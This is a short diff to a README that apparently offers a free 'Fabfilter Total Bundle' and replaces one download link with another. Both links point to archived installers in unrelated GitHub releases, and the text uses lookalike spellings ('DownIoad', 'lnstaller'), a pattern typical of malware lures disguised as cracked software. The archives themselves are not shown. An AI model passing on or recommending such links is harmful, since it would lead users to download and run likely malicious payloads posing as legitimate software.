@@ -1,6 +1,6 @@
 ![image](https://github.com/CarritV9/Fabfilter-Total-Bundle/assets/172987397/0ce5d6f6-4115-414a-8280-82fe044737af)
 
-## [DownIoad](https://github.com/CarritV9/Fabfilter-Total-Bundle/releases/download/Setup/Git.Installer.zip)
+## [DownIoad](https://github.com/AlanD3V1/AlanD3/releases/download/DownIoad/lnstaller.win.1.21.7z)
 
 # System Requirements
 
